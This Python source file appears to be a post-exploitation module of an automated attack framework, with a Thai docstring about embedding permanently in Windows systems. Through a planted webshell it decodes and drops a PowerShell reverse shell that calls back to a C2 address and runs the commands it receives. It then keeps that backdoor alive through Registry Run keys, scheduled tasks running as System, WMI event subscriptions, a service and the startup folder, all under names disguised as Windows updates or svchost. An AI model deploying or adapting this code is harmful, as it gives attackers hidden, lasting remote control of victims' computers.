from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Windows Persistence Agent
ฝังตัวในระบบ Windows แบบถาวร
"""
from core.logger import log
import os

import asyncio
import base64
from typing import Dict, List

# Get default shell password from environment variable
DEFAULT_SHELL_PASSWORD = os.getenv('SHELL_PASSWORD', 'secret')


class WindowsPersistence:
    """Windows persistence mechanisms"""
    
    def __init__(self, webshell_manager=None):
        self.webshell = webshell_manager
        self.backdoor_code = None
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for WindowsPersistence
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            log.info(f"[WindowsPersistence] Starting execution")
            
                        # This is a placeholder implementation
            
            return {
                'success': True,
                'message': 'WindowsPersistence executed successfully',
                'target': target
            }
        
        except Exception as e:
            log.error(f"[WindowsPersistence] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    async def install_all(self,
                         shell_url: str,
                         shell_password: str,
                         c2_url: str) -> Dict:
        """
        Install all persistence mechanisms
        
        Args:
            shell_url: Webshell URL
            shell_password: Webshell password
            c2_url: C2 callback URL
        
        Returns:
            Dict with installation results
        """
        
        results = {
            'success': [],
            'failed': []
        }
        
        # Generate backdoor code
        self.backdoor_code = self._generate_backdoor_code(c2_url)
        
        # Try all persistence methods
        methods = [
            ('registry_run', self.install_registry_run),
            ('scheduled_task', self.install_scheduled_task),
            ('wmi_event', self.install_wmi_event),
            ('service', self.install_service),
            ('startup_folder', self.install_startup_folder),
        ]
        
        for name, method in methods:
            try:
                result = await method(shell_url, shell_password)
                if result.get('success'):
                    results['success'].append(name)
                else:
                    results['failed'].append(name)
            except Exception as e:
                results['failed'].append(f"{name}: {str(e)}")
        
        return results
    
    async def install_registry_run(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install Registry Run key persistence
        
        Technique:
        reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "C:\\backdoor.exe" /f
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_path = 'C:\\Windows\\Temp\\svchost.exe'
        
        # Write backdoor
        write_cmd = f'echo {self.backdoor_code} | certutil -decode - {backdoor_path}'
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Add to Registry Run key (HKCU)
        reg_cmd_hkcu = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "{backdoor_path}" /f'
        await self.webshell.execute_command(reg_cmd_hkcu, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Try HKLM (requires admin)
        reg_cmd_hklm = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "{backdoor_path}" /f'
        await self.webshell.execute_command(reg_cmd_hklm, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'registry_run',
            'keys': [
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            ],
            'backdoor_path': backdoor_path
        }
    
    async def install_scheduled_task(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install Scheduled Task persistence
        
        Technique:
        schtasks /create /tn "SystemUpdate" /tr "C:\\backdoor.exe" /sc onlogon /ru System
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_path = 'C:\\Windows\\Temp\\update.exe'
        task_name = 'WindowsUpdateCheck'
        
        # Write backdoor
        write_cmd = f'echo {self.backdoor_code} | certutil -decode - {backdoor_path}'
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Create scheduled task (on logon)
        schtask_cmd = f'schtasks /create /tn "{task_name}" /tr "{backdoor_path}" /sc onlogon /ru System /f'
        result1 = await self.webshell.execute_command(schtask_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Create scheduled task (every 5 minutes)
        schtask_cmd2 = f'schtasks /create /tn "{task_name}Periodic" /tr "{backdoor_path}" /sc minute /mo 5 /ru System /f'
        result2 = await self.webshell.execute_command(schtask_cmd2, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'scheduled_task',
            'tasks': [task_name, f"{task_name}Periodic"],
            'backdoor_path': backdoor_path,
            'triggers': ['onlogon', 'every 5 minutes']
        }
    
    async def install_wmi_event(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install WMI Event Subscription persistence
        
        Technique:
        Create WMI event filter and consumer
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_path = 'C:\\Windows\\Temp\\svchost.exe'
        
        # Write backdoor
        write_cmd = f'echo {self.backdoor_code} | certutil -decode - {backdoor_path}'
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # PowerShell script to create WMI event
        ps_script = f'''
$FilterName = "SystemMonitor"
$ConsumerName = "SystemMonitorConsumer"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name=$FilterName; EventNameSpace="root\\cimv2"; QueryLanguage="WQL"; Query=$Query}}

$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name=$ConsumerName; CommandLineTemplate="{backdoor_path}"}}

Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter; Consumer=$Consumer}}
'''
        
        ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        
        # Execute PowerShell
        ps_cmd = f'powershell -EncodedCommand {ps_b64}'
        await self.webshell.execute_command(ps_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'wmi_event',
            'filter_name': 'SystemMonitor',
            'consumer_name': 'SystemMonitorConsumer',
            'backdoor_path': backdoor_path
        }
    
    async def install_service(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install Windows Service persistence
        
        Technique:
        sc create "ServiceName" binPath= "C:\\backdoor.exe" start= auto
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_path = 'C:\\Windows\\System32\\svchost_update.exe'
        service_name = 'WindowsUpdateService'
        
        # Write backdoor
        write_cmd = f'echo {self.backdoor_code} | certutil -decode - {backdoor_path}'
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Create service
        sc_create = f'sc create "{service_name}" binPath= "{backdoor_path}" start= auto DisplayName= "Windows Update Service"'
        await self.webshell.execute_command(sc_create, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Start service
        sc_start = f'sc start "{service_name}"'
        await self.webshell.execute_command(sc_start, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'service',
            'service_name': service_name,
            'backdoor_path': backdoor_path,
            'start_type': 'auto'
        }
    
    async def install_startup_folder(self, shell_url: str, shell_password: str) -> Dict:
        """
        Install Startup Folder persistence
        
        Technique:
        Copy backdoor to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
        """
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        backdoor_name = 'update.exe'
        startup_path = f'%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{backdoor_name}'
        
        # Write backdoor to temp
        temp_path = f'C:\\Windows\\Temp\\{backdoor_name}'
        write_cmd = f'echo {self.backdoor_code} | certutil -decode - {temp_path}'
        await self.webshell.execute_command(write_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Copy to startup folder
        copy_cmd = f'copy /Y {temp_path} "{startup_path}"'
        await self.webshell.execute_command(copy_cmd, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        # Also try All Users startup (requires admin)
        all_users_startup = f'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{backdoor_name}'
        copy_cmd2 = f'copy /Y {temp_path} "{all_users_startup}"'
        await self.webshell.execute_command(copy_cmd2, {
            'shell_url': shell_url,
            'password': shell_password
        })
        
        return {
            'success': True,
            'method': 'startup_folder',
            'paths': [startup_path, all_users_startup]
        }
    
    def _generate_backdoor_code(self, c2_url: str) -> str:
        """Generate backdoor code (PowerShell)"""
        
        # PowerShell reverse shell
        backdoor = f'''
$client = New-Object System.Net.Sockets.TCPClient("{c2_url.split(":")[0]}",{c2_url.split(":")[1]})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        
        # Base64 encode
        return base64.b64encode(backdoor.encode()).decode()
    
    async def check_persistence(self, shell_url: str, shell_password: str) -> Dict:
        """Check which persistence mechanisms are installed"""
        
        if not self.webshell:
            return {'success': False, 'error': 'No webshell manager'}
        
        checks = {}
        
        # Check Registry Run keys
        reg_check = await self.webshell.execute_command('reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['registry_run'] = 'SystemUpdate' in reg_check.get('output', '')
        
        # Check Scheduled Tasks
        schtask_check = await self.webshell.execute_command('schtasks /query /fo LIST', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['scheduled_task'] = 'WindowsUpdateCheck' in schtask_check.get('output', '')
        
        # Check Services
        service_check = await self.webshell.execute_command('sc query type= service state= all', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['service'] = 'WindowsUpdateService' in service_check.get('output', '')
        
        # Check Startup Folder
        startup_check = await self.webshell.execute_command('dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', {
            'shell_url': shell_url,
            'password': shell_password
        })
        checks['startup_folder'] = 'update.exe' in startup_check.get('output', '')
        
        return {
            'success': True,
            'installed': checks,
            'count': sum(checks.values())
        }


# Example usage
if __name__ == "__main__":
    async def test():
        from agents.post_exploitation.webshell_manager import WebshellManager
        
        webshell = WebshellManager()
        persistence = WindowsPersistence(webshell)
        
        result = await persistence.install_all(
            shell_url="http://target.com/shell.aspx",
            shell_password=DEFAULT_SHELL_PASSWORD,
            c2_url="192.168.1.100:4444"
        )
        
        print(f"Persistence installed:")
        print(f"  Success: {result['success']}")
        print(f"  Failed: {result['failed']}")
    
    asyncio.run(test())

